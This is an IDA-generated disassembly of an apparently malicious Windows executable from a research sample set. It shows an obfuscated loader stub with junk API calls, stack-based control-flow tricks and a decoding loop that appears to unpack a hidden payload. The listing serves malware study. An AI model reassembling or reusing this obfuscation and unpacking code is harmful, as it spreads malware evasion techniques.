;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	1ABAF285D3D50C35D45695E47FDC22B2
; Input	CRC32 :	28108081

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\1abaf285d3d50c35d45695e47fdc22b2
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 0000175C (   5980.)
; Section size in file		: 00001800 (   6144.)
; Offset to raw	data for section: 0004E400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 90h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401090	proc near		; CODE XREF: start+43j
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		mov	edi, offset aE	; "    e"
		adc	dword ptr [edi-40h], 0FFFFFAAEh
		push	edi
		push	ebx
		push	ecx
		call	sub_401F04
		add	esp, 8
		pop	edi
		mov	esi, 0
		push	esi
		rep call sub_4010C3
		mov	eax, ds:SetEvent
		jmp	eax
sub_401090	endp


; =============== S U B	R O U T	I N E =======================================


sub_4010C3	proc near		; CODE XREF: sub_401090+26p
		pop	ecx
		call	ecx
		mov	ebx, offset GetModuleHandleA
		mov	ebx, [ebx]
		push	ebx
		push	dword ptr [edi+114h]
		pop	ecx
		call	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_4010C3	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401110	proc near		; CODE XREF: sub_401428+20p

var_24		= dword	ptr -24h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 58h
		mov	ebx, offset dword_4BA1B0
		adc	[ebp+var_24], eax
		mov	eax, 0
		push	eax
		rep call sub_401133
		mov	eax, ds:SetEvent
		jmp	eax
sub_401110	endp


; =============== S U B	R O U T	I N E =======================================


sub_401133	proc near		; CODE XREF: sub_401110+16p
		pop	ecx
		call	ecx
		push	ebx
		push	esi
		push	esi
		push	esi
		call	sub_401488
		add	esp, 0Ch
		pop	ebx
		push	0
		rep call sub_401152
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401133	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401152	proc near		; CODE XREF: sub_401133+12p
		pop	ecx
		call	ecx
		add	esp, 58h
		pop	ebp
		retn	0
sub_401152	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 60h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4011BC	proc near		; CODE XREF: sub_401561+15p

var_2C		= dword	ptr -2Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		lea	ebx, dword_4BA09C
		mov	[ebp+var_2C], 0FFFF98D8h
		push	ebx
		push	eax
		push	eax
		push	dword ptr [ebx+35Ch]
		call	sub_401428
		add	esp, 0Ch
		pop	ebx
		push	0
		rep call sub_4011F2
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_4011BC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4011F2	proc near		; CODE XREF: sub_4011BC+29p
		pop	ecx
		call	ecx
		mov	eax, 0
		push	eax
		rep call sub_401208
		mov	eax, ds:GetDC
		jmp	eax
sub_4011F2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401208	proc near		; CODE XREF: sub_4011F2+9p
		pop	ecx
		call	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_401208	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 62h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401274	proc near		; CODE XREF: sub_40134C+1Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	ebx, dword_4BA2CC
		or	eax, 0FFFFB6B0h
		push	ebx
		push	eax
		push	dword ptr [ebx+258h]
		call	sub_4018BC
		add	esp, 8
		pop	ebx
		push	0
		rep call sub_4012A7
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_401274	endp


; =============== S U B	R O U T	I N E =======================================


sub_4012A7	proc near		; CODE XREF: sub_401274+26p
		pop	ecx
		call	ecx
		mov	edx, 0
		push	edx
		rep call sub_4012BD
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_4012A7	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4012BD	proc near		; CODE XREF: sub_4012A7+9p
		pop	ecx
		call	ecx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_4012BD	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4012F8	proc near		; CODE XREF: sub_401FA2+12p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 58h
		mov	eax, offset dword_4BA3C4
		sub	edi, eax
		push	eax
		mov	esi, 0
		push	esi
		rep call sub_40131B
		mov	eax, ds:GetDC
		jmp	eax
sub_4012F8	endp


; =============== S U B	R O U T	I N E =======================================


sub_40131B	proc near		; CODE XREF: sub_4012F8+16p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+1D8h]
		push	edx
		push	ebx
		call	sub_401854
		add	esp, 0Ch
		pop	eax
		push	eax
		push	0
		rep call sub_401341
		mov	eax, ds:lstrlenA
		jmp	eax
sub_40131B	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401341	proc near		; CODE XREF: sub_40131B+19p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 58h
		pop	ebp
		retn	0
sub_401341	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40134C	proc near		; CODE XREF: sub_4016D2+Ap

var_30		= dword	ptr -30h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		lea	esi, [eax-0F8h]
		mov	[ebp+var_30], 28h
		push	esi
		push	dword ptr [esi+2B0h]
		push	edx
		push	edi
		call	sub_401274
		add	esp, 0Ch
		pop	esi
		push	0
		rep call sub_401382
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_40134C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401382	proc near		; CODE XREF: sub_40134C+29p
		pop	ecx
		call	ecx
		rep call sub_401392
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401382	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401392	proc near		; CODE XREF: sub_401382+3p
		pop	ecx
		call	ecx
		add	esp, 50h
		pop	ebp
		retn	0
sub_401392	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40139C	proc near		; CODE XREF: sub_4017ED+Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		lea	esi, [edx-2CCh]
		xor	eax, edi
		push	esi
		push	dword ptr [esi+0Ch]
		push	ebx
		push	dword ptr [esi+3E8h]
		push	dword ptr [esi+264h]
		call	sub_4015F8
		add	esp, 10h
		pop	esi
		mov	edi, 0
		push	edi
		rep call sub_4013D9
		mov	eax, ds:CloseHandle
		jmp	eax
sub_40139C	endp


; =============== S U B	R O U T	I N E =======================================


sub_4013D9	proc near		; CODE XREF: sub_40139C+30p
		pop	ecx
		call	ecx
		push	0
		rep call sub_4013EB
		mov	eax, ds:SetLastError
		jmp	eax
sub_4013D9	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4013EB	proc near		; CODE XREF: sub_4013D9+5p
		pop	ecx
		call	ecx
		add	esp, 28h
		pop	ebp
		retn	0
sub_4013EB	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 33h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401428	proc near		; CODE XREF: sub_4011BC+1Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		lea	eax, dword_4BA120
		adc	ebx, 0FFFF8751h
		push	eax
		push	edi
		push	dword ptr [eax+2CCh]
		push	edi
		push	dword ptr [eax+6Ch]
		call	sub_401110
		add	esp, 10h
		pop	eax
		push	eax
		mov	ecx, 0
		push	ecx
		rep call sub_401465
		mov	eax, ds:CloseHandle
		jmp	eax
sub_401428	endp


; =============== S U B	R O U T	I N E =======================================


sub_401465	proc near		; CODE XREF: sub_401428+30p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		mov	esi, 0
		push	esi
		rep call sub_40147D
		mov	eax, ds:LocalFree
		jmp	eax
sub_401465	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40147D	proc near		; CODE XREF: sub_401465+Bp
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 40h
		pop	ebp
		retn	0
sub_40147D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401488	proc near		; CODE XREF: sub_401133+7p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		lea	ecx, [ebx+120h]
		and	dword ptr [ecx+0F0h], 525Bh
		push	ecx
		push	edi
		push	edx
		call	sub_401BE8
		add	esp, 8
		pop	ecx
		push	ecx
		mov	ecx, 0
		push	ecx
		rep call sub_4014C0
		mov	eax, ds:GetDC
		jmp	eax
sub_401488	endp


; =============== S U B	R O U T	I N E =======================================


sub_4014C0	proc near		; CODE XREF: sub_401488+2Bp
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	0
		rep call sub_4014D4
		mov	eax, ds:SetLastError
		jmp	eax
sub_4014C0	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4014D4	proc near		; CODE XREF: sub_4014C0+7p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 20h
		pop	ebp
		retn	0
sub_4014D4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 61h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401540	proc near		; CODE XREF: sub_401B94+1Fp

var_8		= dword	ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	eax, dword_4BA0D4
		adc	[ebp+var_8], ebx
		push	eax
		push	0
		rep call sub_401561
		mov	eax, ds:SetEvent
		jmp	eax
sub_401540	endp


; =============== S U B	R O U T	I N E =======================================


sub_401561	proc near		; CODE XREF: sub_401540+14p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+0F0h]
		push	dword ptr [eax+268h]
		push	dword ptr [eax+1Ch]
		push	esi
		call	sub_4011BC
		add	esp, 10h
		pop	eax
		push	eax
		rep call sub_40158D
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401561	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40158D	proc near		; CODE XREF: sub_401561+1Fp
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_40158D	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 60h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4015F8	proc near		; CODE XREF: sub_40139C+21p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		lea	edx, [esi+288h]
		and	[edx-270h], ebx
		push	edx
		rep call sub_40161A
		mov	eax, ds:GetTickCount
		jmp	eax
sub_4015F8	endp


; =============== S U B	R O U T	I N E =======================================


sub_40161A	proc near		; CODE XREF: sub_4015F8+15p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	dword ptr [edx+298h]
		push	edi
		push	ecx
		push	edi
		call	sub_401914
		add	esp, 10h
		pop	edx
		push	edx
		mov	esi, 0
		push	esi
		rep call sub_401645
		mov	eax, ds:Sleep
		jmp	eax
sub_40161A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401645	proc near		; CODE XREF: sub_40161A+1Ep
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 28h
		pop	ebp
		retn	0
sub_401645	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 60h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4016B0	proc near		; CODE XREF: sub_401C05+Bp

var_34		= dword	ptr -34h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		lea	eax, [ebx+24h]
		sbb	[ebp+var_34], edi
		push	eax
		mov	edi, 0
		push	edi
		rep call sub_4016D2
		mov	eax, ds:LocalFree
		jmp	eax
sub_4016B0	endp


; =============== S U B	R O U T	I N E =======================================


sub_4016D2	proc near		; CODE XREF: sub_4016B0+15p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+48h]
		push	edi
		push	edi
		call	sub_40134C
		add	esp, 0Ch
		pop	eax
		push	eax
		push	0
		rep call sub_4016F5
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_4016D2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4016F5	proc near		; CODE XREF: sub_4016D2+16p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 38h
		pop	ebp
		retn	0
sub_4016F5	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401700	proc near		; CODE XREF: sub_401B18+18p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	ebx, [edi+1F4h]
		or	esi, ecx
		push	ebx
		push	edx
		push	dword ptr [ebx+128h]
		push	eax
		call	sub_4017C8
		add	esp, 0Ch
		pop	ebx
		push	0
		rep call sub_401731
		mov	eax, ds:CloseHandle
		jmp	eax
sub_401700	endp


; =============== S U B	R O U T	I N E =======================================


sub_401731	proc near		; CODE XREF: sub_401700+24p
		pop	ecx
		call	ecx
		rep call sub_401741
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401731	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401741	proc near		; CODE XREF: sub_401731+3p
		pop	ecx
		call	ecx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_401741	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near

var_4		= dword	ptr -4

		mov	ecx, offset lstrlenA
		push	0
		pop	eax
		nop
		nop
		nop
		nop
		call	ds:GetConsoleTitleA
		add	esp, 0FFFFFFF8h
		xor	eax, eax
		lea	eax, ds:4BA100h[eax*4]
		lea	ecx, [eax+0Ch]
		add	byte ptr [ecx],	4
		push	eax		; lpLibFileName
		call	ds:LoadLibraryW
		push	3Ch
		add	[esp+4+var_4], eax
		pop	ecx
		mov	ecx, [ecx]
		sub	ecx, 0FFFFFFAFh
		mov	eax, [eax+ecx]
		shr	eax, 4
		mov	cl, 25h
		cmp	al, cl
		pusha
		jg	short loc_4017C4
		jmp	sub_401090
; ---------------------------------------------------------------------------

loc_4017C4:				; CODE XREF: start+41j
		popa
		call	dword ptr [esp+0]
start		endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4017C8	proc near		; CODE XREF: sub_401700+19p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		mov	edx, offset dword_4BA34C
		sub	dword ptr [edx+7Ch], 59h
		push	edx
		mov	edx, 0
		push	edx
		rep call sub_4017ED
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_4017C8	endp


; =============== S U B	R O U T	I N E =======================================


sub_4017ED	proc near		; CODE XREF: sub_4017C8+18p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	dword ptr [edx+50h]
		push	dword ptr [edx+2A8h]
		call	sub_40139C
		add	esp, 8
		pop	edx
		push	edx
		mov	edx, 0
		push	edx
		rep call sub_401818
		mov	eax, ds:CloseHandle
		jmp	eax
sub_4017ED	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401818	proc near		; CODE XREF: sub_4017ED+1Ep
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 1Ch
		pop	ebp
		retn	0
sub_401818	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401854	proc near		; CODE XREF: sub_40131B+Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		lea	edx, [eax-70h]
		or	ecx, 0FFFFC524h
		push	edx

loc_401866:				; CODE XREF: sub_40187A+5j
		lea	esi, [edx-354h]
		push	esi
		rep call sub_40187A
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_401854	endp


; =============== S U B	R O U T	I N E =======================================


sub_40187A	proc near		; CODE XREF: sub_401854+19p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short loc_401866
		pop	edx
		push	edx
		push	dword ptr [edx+0FCh]
		push	dword ptr [edx+370h]
		push	ecx
		push	dword ptr [edx+210h]
		call	sub_401EB4
		add	esp, 10h
		pop	edx
		push	edx
		push	0
		rep call sub_4018AF
		mov	eax, ds:GetDC
		jmp	eax
sub_40187A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4018AF	proc near		; CODE XREF: sub_40187A+28p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 50h
		pop	ebp
		retn	0
sub_4018AF	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4018BC	proc near		; CODE XREF: sub_401274+1Bp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		lea	edi, dword_4BA184
		mov	ebx, 6340h
		push	0
		rep call sub_4018DE
		mov	eax, ds:lstrlenA
		jmp	eax
sub_4018BC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4018DE	proc near		; CODE XREF: sub_4018BC+15p
		pop	ecx
		call	ecx
		push	edi
		push	dword ptr [edi+1D0h]
		push	dword ptr [edi+378h]
		push	esi
		push	ecx
		call	sub_401D40
		add	esp, 10h
		pop	edi
		push	0
		rep call sub_401908
		mov	eax, ds:lstrlenA
		jmp	eax
sub_4018DE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401908	proc near		; CODE XREF: sub_4018DE+1Dp
		pop	ecx
		call	ecx
		add	esp, 24h
		pop	ebp
		retn	0
sub_401908	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401914	proc near		; CODE XREF: sub_40161A+Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		lea	ebx, [edx-1B0h]
		adc	edx, 39EEh
		push	ebx
		push	edi
		push	dword ptr [ebx+1E0h]
		call	sub_401F7C
		add	esp, 8
		pop	ebx
		mov	eax, 0
		push	eax
		rep call sub_40194C
		mov	eax, ds:GetDC
		jmp	eax
sub_401914	endp


; =============== S U B	R O U T	I N E =======================================


sub_40194C	proc near		; CODE XREF: sub_401914+2Bp
		pop	ecx
		call	ecx
		push	0
		rep call sub_40195E
		mov	eax, ds:IsWindow
		jmp	eax
sub_40194C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_40195E	proc near		; CODE XREF: sub_40194C+5p
		pop	ecx
		call	ecx
		add	esp, 1Ch
		pop	ebp
		retn	0
sub_40195E	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 1B0h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401B18	proc near		; CODE XREF: sub_401F04+14p

var_24		= dword	ptr -24h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		mov	edi, offset dword_4BA1BC
		add	esi, [ebp+var_24]
		push	edi
		push	edx
		push	dword ptr [edi+1DCh]
		call	sub_401700
		add	esp, 8
		pop	edi
		push	0
		rep call sub_401B48
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401B18	endp


; =============== S U B	R O U T	I N E =======================================


sub_401B48	proc near		; CODE XREF: sub_401B18+23p
		pop	ecx
		call	ecx
		push	0
		rep call sub_401B5A
		mov	eax, ds:lstrlenA
		jmp	eax
sub_401B48	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401B5A	proc near		; CODE XREF: sub_401B48+5p
		pop	ecx
		call	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_401B5A	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401B94	proc near		; CODE XREF: sub_401C64+1Cp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		lea	esi, dword_4BA02C
		adc	eax, edi
		push	esi
		push	dword ptr [esi+3D8h]
		push	ebx
		push	dword ptr [esi+3BCh]
		push	edx
		call	sub_401540
		add	esp, 10h
		pop	esi
		rep call sub_401BC9
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401B94	endp


; =============== S U B	R O U T	I N E =======================================


sub_401BC9	proc near		; CODE XREF: sub_401B94+28p
		pop	ecx
		call	ecx
		push	0
		rep call sub_401BDB
		mov	eax, ds:SetEvent
		jmp	eax
sub_401BC9	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401BDB	proc near		; CODE XREF: sub_401BC9+5p
		pop	ecx
		call	ecx
		add	esp, 54h
		pop	ebp
		retn	0
sub_401BDB	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401BE8	proc near		; CODE XREF: sub_401488+1Bp

var_2C		= dword	ptr -2Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		mov	ebx, offset dword_4BA118
		and	[ebp+var_2C], esi
		rep call sub_401C05
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401BE8	endp


; =============== S U B	R O U T	I N E =======================================


sub_401C05	proc near		; CODE XREF: sub_401BE8+10p
		pop	ecx
		call	ecx
		push	ebx
		push	ecx
		push	dword ptr [ebx+0ACh]
		call	sub_4016B0
		add	esp, 8
		pop	ebx
		push	0
		rep call sub_401C28
		mov	eax, ds:SetEvent
		jmp	eax
sub_401C05	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401C28	proc near		; CODE XREF: sub_401C05+16p
		pop	ecx
		call	ecx
		add	esp, 34h
		pop	ebp
		retn	0
sub_401C28	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401C64	proc near		; CODE XREF: sub_401EB4+13p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 5Ch
		lea	ebx, dword_4BA180
		and	[ebx+1B0h], esi
		push	ebx
		push	dword ptr [ebx+354h]
		push	eax
		call	sub_401B94
		add	esp, 8
		pop	ebx
		rep call sub_401C96
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401C64	endp


; =============== S U B	R O U T	I N E =======================================


sub_401C96	proc near		; CODE XREF: sub_401C64+25p
		pop	ecx
		call	ecx
		rep call sub_401CA6
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401C96	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401CA6	proc near		; CODE XREF: sub_401C96+3p
		pop	ecx
		call	ecx
		add	esp, 5Ch
		pop	ebp
		retn	0
sub_401CA6	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 90h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401D40	proc near		; CODE XREF: sub_4018DE+12p

var_38		= dword	ptr -38h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		sbb	esi, [edi+3Ch]
		lea	eax, dword_4BA370
		push	eax
		mov	ebx, 6B4h
		push	ebx
		push	6B4h
		push	40001h
		mov	edx, 0B9C59E11h
		push	dword ptr [edx+467A9213h]
		sub	[esp+38h+var_38], 2
		mov	edx, offset LoadLibraryW
		pop	dword ptr [edx]
		rep call sub_401D85
		mov	eax, ds:LoadLibraryW
		jmp	eax
sub_401D40	endp


; =============== S U B	R O U T	I N E =======================================


sub_401D85	proc near		; CODE XREF: sub_401D40+38p

arg_0		= dword	ptr  4

		pop	ecx
		call	ecx
		xchg	eax, [esp-4+arg_0]
		pop	dword ptr [eax-160h]
		mov	edx, [eax-160h]
		mov	edx, edx
		sub	ebx, ebx
		dec	ebx
		and	ebx, offset word_40209A
		mov	esi, 22419A76h
		push	dword ptr [ebx]
		pop	dword ptr [edx]
		add	ebx, 1
		add	edx, 1
		mov	edi, 6B4h

loc_401DB6:				; CODE XREF: sub_401D85+51j
		test	edi, edi
		jz	short loc_401DD8
		add	edi, 0FFFFFFFCh
		xor	ecx, ecx
		push	dword ptr [ebx]
		adc	[esp-4+arg_0], esi
		pop	dword ptr [edx+ecx*2]
		sub	esi, esi
		sbb	esi, [ebx+esi*4]
		neg	esi
		shr	esi, 1
		add	ebx, 4
		add	edx, 4
		jmp	short loc_401DB6
; ---------------------------------------------------------------------------

loc_401DD8:				; CODE XREF: sub_401D85+33j
		push	eax
		rep call sub_401DE6
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401D85	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401DE6	proc near		; CODE XREF: sub_401D85+54p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 24h
		pop	ebp
		retn	0
sub_401DE6	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C3h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401EB4	proc near		; CODE XREF: sub_40187A+1Cp

var_8		= dword	ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		mov	edi, offset dword_4BA1E0
		xor	[ebp+var_8], edi
		push	edi
		push	ecx
		push	eax
		call	sub_401C64
		add	esp, 8
		pop	edi
		push	0
		rep call sub_401EDF
		mov	eax, ds:Sleep
		jmp	eax
sub_401EB4	endp


; =============== S U B	R O U T	I N E =======================================


sub_401EDF	proc near		; CODE XREF: sub_401EB4+1Ep
		pop	ecx
		call	ecx
		lea	edx, [edi-1E0h]	; CODE XREF: sub_401EF6+5j
		push	edx
		rep call sub_401EF6
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_401EDF	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401EF6	proc near		; CODE XREF: sub_401EDF+Ap
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short near ptr loc_401EE2+1
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_401EF6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401F04	proc near		; CODE XREF: sub_401090+17p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 50h
		lea	ebx, dword_4BA064
		mov	esi, edx
		push	ebx
		push	eax
		push	ecx
		push	edi
		call	sub_401B18
		add	esp, 0Ch
		pop	ebx
		push	0
		rep call sub_401F30
		mov	eax, ds:GetDC
		jmp	eax
sub_401F04	endp


; =============== S U B	R O U T	I N E =======================================


sub_401F30	proc near		; CODE XREF: sub_401F04+1Fp
		pop	ecx
		call	ecx
		push	0
		rep call sub_401F42
		mov	eax, ds:Sleep
		jmp	eax
sub_401F30	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401F42	proc near		; CODE XREF: sub_401F30+5p
		pop	ecx
		call	ecx
		add	esp, 50h
		pop	ebp
		retn	0
sub_401F42	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401F7C	proc near		; CODE XREF: sub_401914+1Cp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		lea	ecx, dword_4BA1EC
		add	dword ptr [ecx-0C4h], 4077h
		push	ecx
		rep call sub_401FA2
		mov	eax, ds:GetTickCount
		jmp	eax
sub_401F7C	endp


; =============== S U B	R O U T	I N E =======================================


sub_401FA2	proc near		; CODE XREF: sub_401F7C+19p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	ebx
		push	dword ptr [ecx+0E0h]
		push	dword ptr [ecx+0C4h]
		call	sub_4012F8
		add	esp, 0Ch
		pop	ecx
		push	ecx
		rep call sub_401FCB
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401FA2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401FCB	proc near		; CODE XREF: sub_401FA2+1Cp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 60h
		pop	ebp
		retn	0
